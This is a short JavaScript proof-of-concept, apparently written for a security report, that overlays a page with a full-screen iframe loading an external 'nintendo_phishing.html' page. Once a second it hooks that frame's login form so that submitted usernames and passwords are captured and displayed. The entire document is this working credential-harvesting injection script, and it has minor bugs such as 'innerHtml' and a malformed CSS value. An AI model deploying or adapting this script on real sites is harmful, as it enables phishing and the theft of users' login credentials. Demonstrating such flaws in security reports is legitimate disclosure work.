document.body.innerHtml="";

var a=document.createElement("iframe");
a.src="https://khara-h1.github.io/poc/nintendo_phishing.html";
a.name="mainsite";
a.style = "width: 100%; height: 1024px; border: 0;position: absolute; top: 0; right: 0; bottom: 0: left: 0;"; 
document.body.appendChild(a);

function formHandler(e) {
  console.log(e);
  if (e?.srcElement.length > 0) {
    alert("The credentials are been spied on: \n" +
        "Login is : " +
        e.srcElement[1].value +
        "\n" +
        "Password is : " +
        e.srcElement[2].value +
        "\n"
    );
  }
}
function messageHandler(e){
  console.log(e);
}

function hookMessageHandler(){
  mainsite.window.addEventListener("message",messageHandler)
  mainsite.loginForm.onsubmit = (e) => { formHandler(e); };
}
setInterval(hookMessageHandler, 1000);
